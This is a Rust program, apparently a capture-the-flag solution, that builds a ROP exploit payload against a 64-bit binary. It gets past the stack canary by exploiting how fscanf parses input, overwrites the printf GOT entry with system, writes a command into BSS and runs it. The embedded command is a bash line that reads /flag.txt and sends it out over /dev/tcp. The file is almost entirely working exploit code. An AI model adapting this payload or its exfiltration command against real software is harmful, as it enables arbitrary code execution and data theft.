// LIBC offsets
const PRINTF_SYSTEM: u64 = 0x158690 - 0x144af0; // libc_printf - libc_system

// Binary addresses
const GOT_PRINTF: u64 = 0x602030;
const PLT_PRINTF: u64 = 0x400590;
const BSS: u64 = 0x602058;

// ROP Gadgets
const POP_RDI: u64 = 0x004010b3; // pop rdi; ret;
const POP_RBX_RBP: u64 = 0x00400b5d; // pop rbx; pop rbp; ret;
const ADD_MEM: u64 = 0x00400688; // add [rbp-0x3d], ebx; nop [rax+rax]; rep ret;

const COMMAND: &[u8] = b"bash -c 'cat /flag.txt >/dev/tcp/127.1/8080'"; // I dont know why this has to be less than 44 chars
const WSIZE: usize = std::mem::size_of::<u32>();

fn main() {
    const BUFF_SIZE: usize = 1200;
    let mut payload = String::with_capacity(16 * BUFF_SIZE);

    // Buffer until canary
    const PADD_CANARY: usize = 1002;
    append_padding(&mut payload, PADD_CANARY);

    // The + and - signs are consumed by fscanf but do not modify the memory
    // so we can bypass the canary
    payload.push_str("12345678,+\n");
    payload.push_str("12345678,+\n");

    // Buffer until RIP
    const PADD_RIP: usize = 14;
    append_padding(&mut payload, PADD_RIP);

    // GOT.printf = system
    let overwrite_got = [
        POP_RBX_RBP,
        PRINTF_SYSTEM.wrapping_neg(),
        GOT_PRINTF + 0x3d,
        ADD_MEM,
    ];
    append_slice(&mut payload, &overwrite_got);

    // Write command to be executed to BSS
    eprintln!("[+] Size of {}", COMMAND.len());
    let sh = COMMAND
        .chunks(4)
        .map(|c| u32::from_ne_bytes(c.try_into().unwrap()));
    for (i, c) in sh.enumerate() {
        let off = (i * WSIZE) as u64;
        append_slice(
            &mut payload,
            &[
                // write next chunk to BSS
                POP_RBX_RBP,
                c as u64,
                BSS + 0x3d + off,
                ADD_MEM,
            ],
        )
    }

    append_slice(
        &mut payload,
        &[
            // rdi -> COMMAND
            // plt.printf -> system
            //     system(COMMAND)
            POP_RDI, BSS, PLT_PRINTF,
        ],
    );

    write_payload(payload.as_bytes())
}

fn append_padding(payload: &mut String, n: usize) {
    const PADDING: &str = "12345,67890\n";
    for _ in 0..n {
        payload.push_str(PADDING);
    }
}

fn append_slice(payload: &mut String, a: &[u64]) {
    for w in a {
        payload.push_str(&format!("2468,{}\n", *w as u32));
        payload.push_str(&format!("2468,{}\n", *w >> 32 as u32));
    }
}

fn write_payload(payload: &[u8]) {
    use std::fs::File;
    use std::io::prelude::*;
    let mut fd = File::create("test2.txt").expect("can create file");
    fd.write_all(payload).expect("can write file");
}
